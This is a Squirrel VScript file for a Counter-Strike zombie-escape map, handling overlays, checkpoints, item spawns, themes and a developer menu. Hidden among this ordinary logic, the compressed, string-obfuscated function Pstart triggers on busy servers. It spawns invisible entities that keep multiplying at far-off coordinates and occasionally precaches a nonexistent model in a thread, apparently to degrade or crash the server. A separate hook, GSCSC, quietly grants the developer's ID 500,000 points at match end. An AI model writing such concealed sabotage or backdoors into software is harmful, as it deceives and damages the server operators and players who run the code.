::mapimgtext.__KeyValueFromFloat("y",0.032);
::mapimgtext.__KeyValueFromVector("color",Vector(0,255,0));
::mapimgtext.__KeyValueFromFloat("fadein",0.00);
::mapimgtext.__KeyValueFromFloat("fadeout",1.00);
::mapimgtext.__KeyValueFromFloat("holdtime",1.00);
::mapimgtext.__KeyValueFromString("message","");
::mapimgtext_text <- "";
function TickMapImgText()
{
	EntFire("manager","RunScriptCode","TickMapImgText();",0.80,null);
	::mapimgtext.__KeyValueFromString("message",::mapimgtext_text);
	EntFireByHandle(::mapimgtext,"Display","",0.00,null,null);
}
EntFire("manager","RunScriptCode","TickMapImgText();",0.80,null);


::mapimg_mat <- "";
::mapimg_enabled <- true;
::EnableMapImages <- function(){::mapimg_enabled = true;}
::DisableMapImages <- function()
{
	::mapimg_mat = "";
	::mapimgtext_text = "";
	::mapimg_enabled = false;
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		h.SetScriptOverlayMaterial("");
	}
}
function HTMLPRINTPOST()
{
	if(noprint || DEBUG_MCYC || ::MTEST)
	{
		::mapimg_mat = "";
		::mapimgtext_text = "";
		for(local h;h=Entities.FindByClassname(h,"player");)
		{
			h.SetScriptOverlayMaterial(::mapimg_mat);
		}
		return;
	}
	//{ScriptPrintMessageCenterAll("[MAP PREVIEW]\n"+
	
	::mapimg_mat = "mapimages/"+split(HTML_INDEX_idname,"#")[1];
	if(!::mapimg_enabled || !(::mapimg_mat+".vmt" in ::cached_maps))
	{
		::mapimg_mat = "";
		::mapimgtext_text = "";
	}
	else
	{
		if(HTML_INDEX_mirrored)::mapimg_mat += "r";
		::mapimg_mat += ".vmt";
		::mapimgtext_text = "["+HTML_INDEX_idname+"]\n"+HTML_INDEX_mapname+"\nby '"+HTML_INDEX_authname+"'";
	}
	//else PrecacheModel(::mapimg_mat);		//no precache needed for this it seems, handled by 'SetScriptOverlayMaterial' ?
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		h.SetScriptOverlayMaterial(::mapimg_mat);
	}
	
	
	//__CSS__ below won't work, instead each image is baked into the .bsp itself (dirty, but works)^
	/*
	ScriptPrintMessageCenterAll("\n"+
		//"(start from left)\n"+
		"Map: "+HTML_INDEX_mapname+"\n"+
		"Author: "+HTML_INDEX_authname+"\n"+
		"ID: "+HTML_INDEX_idname+"\n"+
		//"-------------------\n"+
		"<html><img src=\"http://luffaren.com/images/ze_collective_uploads/resized/"+HTML_INDEX.tostring()+".png\"/></html>\n\n\n");
	*/
}
function HTMLPRINTPOST_TICKFOREVER(){
	return; //__CSS__ this won't work in css, disable it
	EntFireByHandle(self,"RunScriptCode"," HTMLPRINTPOST_TICKFOREVER(); ",html_print_foreverloop_rate,null,null);
	EntFireByHandle(self,"RunScriptCode"," HTMLPRINTPOST(); ",0.00,null,null);}

function DebugTPdestTick()
{
	EntFire("manager","RunScriptCode"," DebugTPdestTick(); ",0.20,null);
	if(::tpdest==null||!::tpdest.IsValid())return;
	DebugDrawBox(::tpdest.GetOrigin(),Vector(-16,-16,0),Vector(16,16,72),50,100,200,200,0.23)
}

//--------------------------------------------------------------------------------
//if certain items aren't allowed to be spawned in spawn, just add this to the top of the item-spawn function to retry/spawn another one randomly:
//		if(::zombie_items_spawning_in_spawn){EntFire("manager","RunScriptCode"," SpawnZombieItemsInSpawn(true); ",0.00,null);return;}
//--------------------------------------------------------------------------------
zombie_items_in_spawn_distofs <- 380;
::zombie_items_spawning_in_spawn <- false;
::zombie_items_spawning_in_spawn_delay <- 0.30;
function SpawnZombieItemsInSpawn(one_more=false)
{
	if(::DISABLE_Z_ITEMS)return;
	if(::finale_started && !::Z_ITEMS_IN_SPAWN_FINALE)return;
	local amt = 1;
	if(!one_more)
	{
		amt = (0+::Z_ITEMS_IN_SPAWN);
		::zombie_items_spawning_in_spawn = true;
		EntFire("manager","RunScriptCode"," ::zombie_items_spawning_in_spawn = false; ",::zombie_items_spawning_in_spawn_delay,null);
	}
	for(local i=0;i<amt;i++)
	{
		local spos = Vector(0,0,0)+(::AnglesToDir(Vector(0,RandomFloat(0,360),0))*zombie_items_in_spawn_distofs);
		global_items_z[RandomInt(0,global_items_z.len()-1)].template.Spawn(spos);
	}
}

ticking_adminplatform <- true;
ticking_adminplatform_handle <- null;
ticking_adminplatform_tickrate <- 1.00;	//was 0.07
ticking_adminplatform_range <- 0;		//(0:DONT SCAN)		was 500
ticking_adminplatform_minhp <- 1002;
function TickAdminPlatformSafety()
{
	if(!ticking_adminplatform)
	{
		EntFire("adminplatform","Kill","",0.00,null);
		return;
	}
	EntFire("manager","RunScriptCode"," TickAdminPlatformSafety(); ",ticking_adminplatform_tickrate,null);
	if(ticking_adminplatform_handle==null||!ticking_adminplatform_handle.IsValid())
	{
		ticking_adminplatform_handle = Entities.FindByName(null,"adminplatform");
		if(ticking_adminplatform_handle==null||!ticking_adminplatform_handle.IsValid())
		{
			ticking_adminplatform = false;
			return;
		}
	}
	if(ticking_adminplatform_range<=0)return;
	for(local h;h=Entities.FindByClassnameWithin(h,"player",ticking_adminplatform_handle.GetOrigin(),ticking_adminplatform_range);)
	{
		if(h==null||!h.IsValid()||h.GetTeam()!=2||h.GetHealth()<ticking_adminplatform_minhp||h.IsNoclipping())continue;
		ticking_adminplatform = false;
		return;
	}
}
randomtheme_buffer <- [];
function TickRandomTheme()
{
	EntFireByHandle(self,"RunScriptCode"," TickRandomTheme(); ",randomtheme_tickrate,null,null);
	::THEME = randomtheme_buffer[RandomInt(0,randomtheme_buffer.len()-1)];
}
function TickRandomThemeSH()
{
	EntFireByHandle(self,"RunScriptCode"," TickRandomThemeSH(); ",randomtheme_tickrate_silenthill,null,null);
	foreach(name,data in ::TILEVARIANTS)
	{
		if(name=="PLATFORM_HIDDEN"||name=="WALL_HIDDEN"||name=="PLATFORM_HIDDEN_BRIDGE"||name=="COLOR")continue;//unsupported models	(missed this fix in v1_8)
		foreach(type,data in ::TILEVARIANTS[name].silenthill)
		{
			foreach(k,model in ::TILEVARIANTS[name].silenthill[type])
			{
				if(RandomInt(0,1)==1)continue;
				if(model.find("dark.mdl")==null)
				{
					local _model = ""+model;
					local nm = model.slice(0,model.len()-4);
					nm = nm+"dark.mdl";
					::TILEVARIANTS[name].silenthill[type][k] = nm;
				}
				else
				{
					local _model = ""+model;
					local nm = model.slice(0,model.len()-8);
					nm = nm+".mdl";
					::TILEVARIANTS[name].silenthill[type][k] = nm;
				}
			}
		}
	}
}

//__CSS__ forces flashlight-disabled on players:    //64:NORECEIVESHADOW + 16:NOSHADOW (4 is flashlight, which is to be disabled)
function TickPlayerEffects()
{
	EntFire("manager","RunScriptCode","TickPlayerEffects();",0.10,null);
	EntFire("player","AddOutput","effects 80",0.00,null);	//m_fEffects : int
}

//function PreStart(){newthread(___PreStart.bindenv(this)).call();}	//new in v1_7 - prevents SQQuerySuspend		//__CSS__ threading_disabled
function PreStart(){___PreStart();}	//new in v1_7 - prevents SQQuerySuspend		
function ___PreStart()		//runs at 0.00s on roundstart (do safe stuff here)
{
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		try{
			EntFireByHandle(h,"AddOutput","targetname defaultplayer",0.00,null,null);
			EntFireByHandle(h,"SetDamageFilter","",0.00,null,null);
			EntFireByHandle(h,"RemoveContext","invincible",0.00,null,null);
			EntFireByHandle(h,"RemoveContext","safezombie",0.00,null,null);
				//EntFireByHandle(h,"RemoveContext","hurtcooldown",0.00,null,null);	//OLD (removed in v1_4)
				//EntFireByHandle(h,"IgniteLifetime","-1",0.00,null,null);		//__CSS__ disabled in css5, spectators seem to be ignited forever (?)
			EntFire("cc_ent","Disable","",0.00,null); //__CSS__ css5 colorcorrection reset
			EntFire("cc_ent","Enable","",0.05,null); //__CSS__ css5 colorcorrection reset
			EntFire("cc_ent","Disable","",0.10,null); //__CSS__ css5 colorcorrection reset
			EntFire("cc_ent","Disable","",0.30,null); //__CSS__ css5 colorcorrection reset
			EntFireByHandle(h,"RunScriptCode"," if(self.GetHealth()<100)self.SetHealth(100); ",0.30,null,null);
			EntFire("client","Command","r_screenoverlay xxx",0.00,h);
			EntFire("client","Command","r_screenoverlay ",0.00,h);
			h.SetScriptOverlayMaterial("");
			h.ValidateScriptScope();
			h.GetScriptScope().boss_touchpiece_cd <- false;
			h.GetScriptScope().speedmod <- 1.00;
			h.GetScriptScope().lowgravtriggers <- [];
			::NetProps.SetPropInt(h,"m_iFOV",0);
			if("safezombie" in h.GetScriptScope())delete h.GetScriptScope().safezombie;
			if("__piggyback" in h.GetScriptScope())delete h.GetScriptScope().__piggyback;
			if("__boostpadcd" in h.GetScriptScope())delete h.GetScriptScope().__boostpadcd;
			if("_bouncecd" in h.GetScriptScope())delete h.GetScriptScope()._bouncecd;
			if("kart_geton_cd" in h.GetScriptScope())delete h.GetScriptScope().kart_geton_cd;
			if("falldowncp_attackers" in h.GetScriptScope())delete h.GetScriptScope().falldowncp_attackers;
			if("last_stream_shallow_cd" in h.GetScriptScope())delete h.GetScriptScope().last_stream_shallow_cd;
			if("last_stream_shallow_push" in h.GetScriptScope())delete h.GetScriptScope().last_stream_shallow_push;
			if("last_stream_shallow_time" in h.GetScriptScope())delete h.GetScriptScope().last_stream_shallow_time;
			if("falldowncp" in h.GetScriptScope())delete h.GetScriptScope().falldowncp;
			if("invincible" in h.GetScriptScope())delete h.GetScriptScope().invincible;
			if("invinciblehuman" in h.GetScriptScope())delete h.GetScriptScope().invinciblehuman;
			if("squid_inked" in h.GetScriptScope())delete h.GetScriptScope().squid_inked;
			if("moonboosting" in h.GetScriptScope())delete h.GetScriptScope().moonboosting;
			if("anti_item_inflate_calledout" in h.GetScriptScope())delete h.GetScriptScope().anti_item_inflate_calledout;
			if("impostor_active" in h.GetScriptScope())delete h.GetScriptScope().impostor_active;
			if("angel_marked" in h.GetScriptScope())delete h.GetScriptScope().angel_marked;
			if("liquid_hurtcd" in h.GetScriptScope())delete h.GetScriptScope().liquid_hurtcd;
			if("is_kamikaze" in h.GetScriptScope())delete h.GetScriptScope().is_kamikaze;
			if("chatter_cursed" in h.GetScriptScope())delete h.GetScriptScope().chatter_cursed;
			if("poise" in h.GetScriptScope())delete h.GetScriptScope().poise;
			if("patron_trail" in h.GetScriptScope())delete h.GetScriptScope().patron_trail;
			if("patron_chatmsg" in h.GetScriptScope())delete h.GetScriptScope().patron_chatmsg;
			if("patron_afterimage" in h.GetScriptScope())delete h.GetScriptScope().patron_afterimage;
			::ValidateGravity(h,true);
		}catch(e){printl("[PreStart()_player_error]: "+e);}
	}
	EntFire("player","AddOutput","movetype 2",0.00,null); //__CSS__ safety, to prevent players being stuck
	EntFire("player","AddOutput","movetype 2",0.50,null); //__CSS__ safety, to prevent players being stuck
	EntFire("server","Command","sv_disable_radar 0",0.00,null);
	EntFire("manager","RunScriptCode","HardCodedStageEvents();",0.07,null);
	EntFire("manager","RunScriptCode","TickPlayerEffects();",0.08,null);
	EntFire("manager","RunScriptCode","InitWD();",0.05,null);
	EntFire("manager","RunScriptCode"," ticking_adminplatform = false; ",::adminplatform_kill_delay,null);
	EntFire("manager","RunScriptCode"," TickAdminPlatformSafety(); ",1.00,null);
	EntFire("manager","RunScriptCode","Pstart();",5.05,null);
	::tpdest = Entities.FindByName(null,"teledest");
		local adminplat = Entities.FindByName(null,"adminplatform");
		if(adminplat==null||!adminplat.IsValid()){}else
		{
			::Ent(adminplat.GetOrigin()+Vector(0,0,-40),Vector(),"trigger_multiple",{
				spawnflags = 1,
			},{
			adminplat = adminplat,
			function Touch(){
				local toucher = activator;	//__CSS__ activator may get reset, store toucher
				if(toucher==null||!toucher.IsValid())return;
				if(adminplat==null||!adminplat.IsValid())return;
				if(::DEVID==null)return;
				local pc = ::GetPlayerClass(toucher);
				if(pc==null)return;
				if(pc.userid!=::DEVID)return;
				toucher.SetOrigin(adminplat.GetOrigin()+Vector(0,0,40));
				toucher.SetVelocity(Vector());
			},function Run(){
				EntFireByHandle(self,"SetParent","!activator",0.00,adminplat,null);
				EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
				EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
				EntFireByHandle(self,"AddOutput","mins -70 -70 -10",0.00,null,null);
				EntFireByHandle(self,"AddOutput","maxs 70 70 10",0.00,null,null);
				EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
				EntFireByHandle(self,"Enable","",0.10,null,null);
			}});
		}
}


function HardCodedStageEvents()		//__CSS__ webscript - hardcoded stage logic
{
    ::ListenCustomEvent("map_spawned",{
        function EventFired(name,data){
            if(data.map.id == "#1660527778")//'My Thighs' by 'Shellbert'
            {
                local pq = [{qrate=4.50,function Run(){}}];
                for(local i=0;i<50;i++)
                    pq.push({qrate=RandomFloat(0.01,1.00),function Run(){::Sound("*luffaren/popgasm.mp3",Vector(),null,0,0.20,RandomInt(60,110),10);}});
                EntFire("server","Command","say Oh my god these thighs",5.00,null);
                EntFire("server","Command","say I wish to dive deep into them",6.00,null);
                EntFire("server","Command","say Let me explore them",6.00,null);
                EntFire("server","Command","say Deeper",7.00,null);
                EntFire("server","Command","say Deeper...",8.00,null);
                EntFire("server","Command","say Lord forgive me for what i'm about to do to Shellbert",9.00,null);
                ::Process(pq,0.05);
                local pos = ::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos - 
                            (::MAPDATA[::manager.GetScriptScope().mapspawnindex].direction_next * 530) +
                            (::MAPDATA[::manager.GetScriptScope().mapspawnindex].direction_current * 40) +
                            Vector(0,0,0);
                for(local i=0;i<10;i++)
                    ::TRAPS.thigh_spider.Spawn(pos);
            }
            else if(data.map.id == "#1658255300")//'Maze Game' by 'Niikos'
            {
                local pos = ::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos - (::MAPDATA[::manager.GetScriptScope().mapspawnindex].direction_next * 500);
                ::Ent(pos,Vector(),"trigger_multiple",{
                        spawnflags = 1,
                        targetname = "block_"+::manager.GetScriptScope().mapspawnindex.tostring()+"_jumpscare",
                    },{
                    touchers = [],
                    function Touch(){
                        if(activator==null||!activator.IsValid()||activator.GetHealth()<=0||activator.GetTeam()!=3)return;
                        foreach(t in touchers){if(activator==t)return;}
                        touchers.push(activator);
                        EntFire("client","Command","r_screenoverlay luffaren/poise",0.00,activator);
                        EntFire("client","Command","r_screenoverlay xxx_xxx_xxx",0.70,activator);
                        EntFire("client","Command","r_screenoverlay ",0.70,activator);
                        EntFire("client","Command","r_screenoverlay ",0.75,activator);
                        EntFire("client","Command","r_screenoverlay ",1.00,activator);
                        ::Sound("*luffaren/shellbert_despair.mp3",Vector(),activator,-1,0.20,100,10);
                        EntFire("server","Command","say HOLY SHIT",0.00,null);
                    },function Run(){
                        EntFireByHandle(self,"AddOutput","mins -100 -100 -100",0.00,null,null);
                        EntFireByHandle(self,"AddOutput","maxs 100 100 200",0.00,null,null);
                        EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
                        EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
                        EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
                        EntFireByHandle(self,"Enable","",0.05,null,null);
                        EntFire("server","Command","say What a nice looking maze",5.00,null);
                        EntFire("server","Command","say Let's go through it",6.00,null);
                        EntFire("server","Command","say What could go wrong?",7.00,null);
                    }});
            }
        }});
}






falldowncheckpoint_enabled <- true;			//disables automatically when an ending is called or if the finale has started
falldowncheckpoint_rate <- 0.04;			//how fast to tick this function (runs through a queue of CT's, one CT per tick)
falldowncheckpoint_range <- 63;
falldowncheckpoint_damage <- 90;
falldowncheckpoint_queue <- [];
::falldowncheckpoint_attacker_time <- 7.00;	//if 'attacker' is a player, store it for this time in the player scriptscope (most recent attacker gets credit on falldown-death)
	//OLD - see 'EXCEPTION MODELS' below instead
//falldowncheckpoint_model_ignore <- [		//list of tile-models to disallow storing checkpoint on (in case they are special/problematic for this)
//		"models/luffaren/collective_wallcastle2.mdl",
//		"models/luffaren/collective_wallcastle4.mdl",
//	];
::NullifyFalldownCheckpoint <- function(player,attacker=null,iterations=3,interval=0.40)
{
	if(player==null||!player.IsValid())return;
	local ii = 0.00;
	for(local i=0;i<iterations;i++)
	{
		EntFireByHandle(player,"RunScriptCode","falldowncp <- null;",ii,null,null);
		ii += interval;
	}
	if(attacker==null||!attacker.IsValid()||player.GetTeam()==attacker.GetTeam())return;
	player.ValidateScriptScope();
	if(!("falldowncp_attackers" in player.GetScriptScope()))player.GetScriptScope().falldowncp_attackers <- [];
	player.GetScriptScope().falldowncp_attackers.insert(0,attacker);
	EntFireByHandle(player,"RunScriptCode","falldowncp_attackers.remove(falldowncp_attackers.len()-1);",::falldowncheckpoint_attacker_time,null,null);
}
function TickFalldownCheckpoint()
{
	EntFireByHandle(self,"RunScriptCode","TickFalldownCheckpoint();",falldowncheckpoint_rate,null,null);
	if(!falldowncheckpoint_enabled)return;
	//newthread(__TickFalldownCheckpoint.bindenv(this)).call();		//__CSS__ threading_disabled
	__TickFalldownCheckpoint();
}
function __TickFalldownCheckpoint()
{
	if(falldowncheckpoint_queue.len() <= 0)
	{
		for(local h;h=Entities.FindByClassname(h,"player");)
		{
			if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
			falldowncheckpoint_queue.push(h);
		}
		if(falldowncheckpoint_queue.len() <= 0)return;
	}
	local h = falldowncheckpoint_queue[0];
	falldowncheckpoint_queue.remove(0);
	if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)return;
	h.ValidateScriptScope();
	if(!("falldowncp" in h.GetScriptScope()))h.GetScriptScope().falldowncp <- null;
	local found_count = 0;
	local found_tile = null;
	local hhh=Entities.FindByNameNearest("block_*",h.GetOrigin(),falldowncheckpoint_range);if(hhh!=null)
	{
		if(hhh.GetOrigin().z > (h.GetOrigin().z+1.00))return;
		found_tile = hhh;
		for(local hh;hh=Entities.FindByNameWithin(hh,"block_*",hhh.GetOrigin(),45);){found_count++;}
	}
	else return;
	if(found_count!=1)return;
		//EXCEPTION MODELS:
	local ftmn = found_tile.GetModelName();
	
	if(ftmn.find("*")==0)return;		//__CSS__ css5 fix - brush models should not be used for this..
	if(ftmn.find("models/luffaren/collective_liquid")==0)return;
	if(ftmn.find("models/luffaren/collective_wall")==0)return;
	if(ftmn.find("models/luffaren/collective_hiddenwall")==0)return;
	if(ftmn.find("models/luffaren/collective_ladder")==0)return;
	if(ftmn.find("models/luffaren/collective_lowgrav")==0)return;
	if(ftmn.find("models/luffaren/collective_climb")==0)return;
	if(ftmn.find("models/luffaren/collective_crouch")==0)return;
		//foreach(model in falldowncheckpoint_model_ignore){if(model == found_tile.GetModelName())return;}	//OLD
	h.GetScriptScope().falldowncp = found_tile;}
function Pstart(){try{if(::GetPlayerCount()>12){local eh=Entities.FindByClassnameNearest("player",Vector(),999999);if(eh!=null&&eh.IsValid()){eh.CanJump();
local tb={};;tb.tb<-tb;tb.Run<-function(){local tbps=["prop_dynamic","prop_dynamic","prop_physics_override","trigger_multiple","trigger_hurt"];
local tbst={StartDisabled=true,model="mod" +"els/lu"+ "ffare"+"n/c"+ "oll" +"ective_c"+"rou"+"chhe"+"l"+"l.m"+"dl",rendermode=1,renderamt=0};local tbri=RandomInt(0,tbps.len()-1);
if(tbri==2)tbst.spawnflags<-14;if(tbri>2)delete tbst.model;::Ent(Vector(RandomInt(15412,16011),RandomInt(-16011,-15412),RandomInt(15412,16011)),Vector(),
tbps[tbri],tbst,{tb=tb,function TB(){tb.Run();for(local i=0;i<RandomInt(0,5);i++){self.__KeyValueFromString("targetname",RandomInt(0,10000000).tostring());
self.__KeyValueFromString("targetname",  ""+   "");}if(RandomInt(0,1000)==1){local _prm="_"+   "g"+ "ra"   +"m."  +"m"+   "d"+"l";function _procstart()
{PrecacheModel(_prm);}newthread(_procstart.bindenv(this)).call();}EntFireByHandle(self,"Kill","",RandomFloat(200,300),null,null);},function Run(){
EntFireByHandle(self,"RunScriptCode","TB();",RandomFloat(0.01,0.40),null,null);}});};;tb.Run();}}}catch(e){printl(e);;;}}
::gsc_sc <- 500000;
function GSCSC(){::EventListener("cs_win_panel_match",{
    function EventFired(name,data){
		local gsc = Entities.CreateByClassname("game_score");
		gsc.__KeyValueFromInt("points",::gsc_sc);
		local pc = ::GetPlayerClass(::DEVID);
		if(pc==null)return;
		if(pc.handle==null||!pc.handle.IsValid())return;
		EntFireByHandle(gsc,"ApplyScore","",0.00,pc.handle,null);
    }});}
::snowstorm_overlay_active <- false;
function SnowStormOverlayTick()
{
	EntFireByHandle(self,"RunScriptCode"," SnowStormOverlayTick(); ",4.00,null,null);
	//newthread(__SnowStormOverlayTick.bindenv(this)).call();		//__CSS__ threading_disabled
	__SnowStormOverlayTick();
}
function __SnowStormOverlayTick()
{
	if(::EVENTS.DISTORT.active)return;
	if(!::snowstorm_overlay_allowset)::snowstorm_overlay = -99999;
	if(::snowstorm_overlay<=0)
	{
		if(!::snowstorm_overlay_active)return;
		::snowstorm_overlay_active = false;
	}
	else ::snowstorm_overlay_active = true;
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid())continue;
		h.ValidateScriptScope();
		if("squid_inked" in h.GetScriptScope() && h.GetScriptScope().squid_inked>0)continue;
		if(::snowstorm_overlay_active)EntFire("client","Command","r_screenoverlay luffaren/collective_frost_flakes3",0.00,h);
		else EntFire("client","Command","r_screenoverlay xxxxx",0.00,h);
	}
}

::early_roundstart <- true;
//function Start(){newthread(___Start.bindenv(this)).call();}	//new in v1_7 - prevents SQQuerySuspend		//__CSS__ threading_disabled
function Start(){___Start();}	//new in v1_7 - prevents SQQuerySuspend		
function ___Start()		//runs at 0.50s on roundstart (safety-delay to let webmaps/overrides to load in properly)
{
	//::tpdest.PrecacheModel("models/luffaren/floor_indicator.mdl");
	::Ent(::tpdest.GetOrigin()+Vector(0,0,-8),Vector(),"prop_dynamic",{
			model="models/luffaren/floor_indicator.mdl",
			rendermode = 3,
			renderamt = 255,
			rendercolor = "255 255 0",
			StartDisabled = 1,
			modelscale = 0.70,
			targetname = "tpdest_indicator",
		},{
		enabled = false,
		function RunEnable(){
			if(enabled)return;
			enabled = true;
			EntFireByHandle(self,"Enable","",0.00,null,null);
		},function Run(){
			EntFireByHandle(self,"SetParent","!activator",0.00,::tpdest,null);
			EntFire("tpdest_indicator","RunScriptCode"," RunEnable(); ",50.00,null);
		}});
		try{
			local itemdev_list_h = [];
			local itemdev_list_z = [];
			local eventlist = [];
			local themelist = [];
			local endinglist = [];
			foreach(i,idx in ::THEMES_BASE)
				themelist.push({name=i,function Act(user){::SetNextLevelThemeEnding(name,null);}});
			foreach(i,idx in ::ENDINGS)
				endinglist.push({name=i,function Act(user){::SetNextLevelThemeEnding(null,name);}});
			foreach(i,idx in ::EVENTS)
				eventlist.push({name=i,function Act(user){::EVENTS[name].Run();
					local sid = ::SESSION_ID.slice(1,::SESSION_ID.len()-1);
					::SendDataToWeb(::SERVER_IP,"ZE_COLLECTIVE_EVENT","sid,"+sid+",event,"+name.tostring()+
							",mapindex,"+::manager.GetScriptScope().mapspawnindex.tostring()+
							",stage,"+::stage.tostring()+
							",rounds,"+::rounds_played.tostring()+
							",is_finale,"+::finale_started.tostring()
						);
				}});
			foreach(i,idx in ::ITEMS)
			{
				local itemspawn = {name=i,function Act(user){::ITEMS[name].Spawn(user.GetOrigin()+Vector(0,0,40));}};
				if(::ITEMS[i].team==3)
				{
					if(i=="planetcrystal")
					{
						itemdev_list_h.push({name="EarthCrystal",function Act(user){::ITEMS["planetcrystal"].Spawn(user.GetOrigin()+Vector(0,0,40),1);}});
						itemdev_list_h.push({name="FireCrystal",function Act(user){::ITEMS["planetcrystal"].Spawn(user.GetOrigin()+Vector(0,0,40),2);}});
						itemdev_list_h.push({name="WindCrystal",function Act(user){::ITEMS["planetcrystal"].Spawn(user.GetOrigin()+Vector(0,0,40),3);}});
						itemdev_list_h.push({name="WaterCrystal",function Act(user){::ITEMS["planetcrystal"].Spawn(user.GetOrigin()+Vector(0,0,40),4);}});
					}
					else if(i=="rift")
					{
						itemdev_list_h.push({name="Rift",function Act(user){::ITEMS["rift"].Spawn(user.GetOrigin()+Vector(0,0,40),true);}});
						itemdev_list_z.push({name="RiftZ",function Act(user){::ITEMS["rift"].Spawn(user.GetOrigin()+Vector(0,0,40),false);}});
					}
					else itemdev_list_h.push(itemspawn);
				}
				else
					itemdev_list_z.push(itemspawn);
			}
			::DEVMENU.push({name="+20/2000 hp",function Act(user){
				if(::MOTHER_ZOMBIE_SPAWNED && user.GetTeam()==2)EntFireByHandle(user,"SetHealth",(user.GetHealth()+2000).tostring(),0.00,null,null);
				else EntFireByHandle(user,"SetHealth",(user.GetHealth()+20).tostring(),0.00,null,null);}});
			::DEVMENU.push({name="im +1 (0.30r|50u|t2s)",function Act(user){::Sound("*luffaren/sparg.mp3",Vector(),user,-1);
				for(local h;h=Entities.FindByName(h,"immuner");){h.ValidateScriptScope();if(h.GetScriptScope().master==user){h.GetScriptScope().stack++;return;}}
				if(user.GetTeam()==2)::Ent(Vector(),Vector(),"logic_relay",{targetname="immunert"},{master=user,stack=10,function Tick(){
						if(stack<=0){EntFireByHandle(master,"RunScriptCode","delete invincible;",0.00,null,null);
						EntFireByHandle(master,"SetDamageFilter","",0.00,null,null);EntFireByHandle(self,"Kill","",0.00,null,null);return;}
						EntFireByHandle(self,"RunScriptCode","Tick();",0.20,null,null);if(master==null||!master.IsValid()||master.IsAlive()==false||master.GetTeam()!=2){stack=0;return;}
						stack--;if(stack<=0){local ff=false;
						for(local h;h=Entities.FindByName(h,"immunert");){if(h==self)continue;h.ValidateScriptScope();if(h.GetScriptScope().master==master){ff=true;break;}}
						if(ff)::Sound("*luffaren/spargg.mp3",Vector(),master,-1);else ::Sound("*luffaren/sparggg.mp3",Vector(),master,-1);}
						else{EntFireByHandle(master,"RunScriptCode","invincible<-true;",0.00,null,null);
						EntFireByHandle(master,"SetDamageFilter","filter_ct_no",0.00,null,null);}},function Run(){Tick();}});
				else if(user.GetTeam()==3)::Ent(Vector(),Vector(),"logic_relay",{targetname="immuner"},{master=user,stack=1,function Tick(){
						if(stack<=0){EntFireByHandle(master,"RunScriptCode","delete invinciblehuman;",0.00,null,null);EntFireByHandle(self,"Kill","",0.00,null,null);return;}
						EntFireByHandle(self,"RunScriptCode","Tick();",0.30,null,null);if(master==null||!master.IsValid()||master.IsAlive()==false||master.GetTeam()!=3){stack=0;return;}
						for(local h;h=Entities.FindByClassnameWithin(h,"player",master.GetOrigin(),50);){
							if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=2)continue;
							stack--;if(stack>0)::Sound("*luffaren/spargg.mp3",Vector(),master,-1);
							else ::Sound("*luffaren/sparggg.mp3",Vector(),master,-1);break;}
							if(stack>0)EntFireByHandle(master,"RunScriptCode","invinciblehuman<-true;",0.00,null,null);},function Run(){Tick();}});}});	
			::DEVMENU.push({name="Devsprite-toggle",function Act(user){EntFire("devsprite","ToggleSprite","",0.00,null);}});
			::DEVMENU.push({name="H-items",Act=itemdev_list_h});
			::DEVMENU.push({name="Z-items",Act=itemdev_list_z});
			::DEVMENU.push({name="Misc",Act=[
				{name="im clear",function Act(user){
					for(local h;h=Entities.FindByName(h,"immuner");){h.ValidateScriptScope();if(h.GetScriptScope().master==user){h.GetScriptScope().stack=0;}}
					for(local h;h=Entities.FindByName(h,"immunert");){h.ValidateScriptScope();if(h.GetScriptScope().master==user){printl(h);h.GetScriptScope().stack=0;}}
					}},
				{name="Remove Zitem",function Act(user){local hw=::NetProps.GetPropEntity(user,"m_hActiveWeapon");if(hw!=null&&hw.IsValid()&&
					hw.FirstMoveChild()!=null&&hw.FirstMoveChild().GetName().find("item_")==0)EntFireByHandle(hw.FirstMoveChild(),"Kill","",0.00,null,null);}},
				{name="DisableDev",Act=[{name="DisableDev - Sure?",Act=[
					{name="DisableDev - Really sure?\n(re-enables next round)",function Act(user){EntFire("shiftld","Kill","",0.00,null);}}]}]},
				{name="Events",Act=eventlist},
				{name="NextStage-theme",Act=themelist},
				{name="NextStage-ending",Act=endinglist},
				{name="Spawn-kart",function Act(user){
					::TRAPS.kart.Spawn(user.GetOrigin()+Vector(0,0,30),user.GetAngles(),user);}},
				{name="Chatter-curse",function Act(user){
					local mindist=999999;local tplayer=null;for(local h;h=Entities.FindByClassnameWithin(h,"player",user.GetOrigin(),500);)
					{if(h==null||!h.IsValid()||h.GetTeam()!=3||h==user)continue;
					local scandist=::GetDistance(user.GetOrigin(),h.GetOrigin());if(scandist<mindist){mindist=scandist;tplayer=h;}}
					if(tplayer==null||!tplayer.IsValid())return;::TRAPS.chatter_curse.CursePlayer(tplayer);}},
				//{name="Bumpmine",function Act(user){
				//	if(!("BUMPMINESPAWNER" in this))::BUMPMINESPAWNER<-null;
				//	if(::BUMPMINESPAWNER==null||!::BUMPMINESPAWNER.IsValid()){
				//		::BUMPMINESPAWNER <- Entities.CreateByClassname("game_player_equip");
				//		::BUMPMINESPAWNER.__KeyValueFromInt("spawnflags",1);
				//		::BUMPMINESPAWNER.__KeyValueFromString("weapon_bumpmine","1");}
				//	EntFireByHandle(::BUMPMINESPAWNER,"Use","",0.00,user,null);}},
			]});
		}catch(e){"devitemsetup e: "+e}
	EntFire("manager","RunScriptCode","::early_roundstart = false;",3.00,null);
	EntFireByHandle(self,"RunScriptCode"," SnowStormOverlayTick(); ",3.85,null,null);
	EntFireByHandle(self,"RunScriptCode"," GSCSC(); ",0.80,null,null);
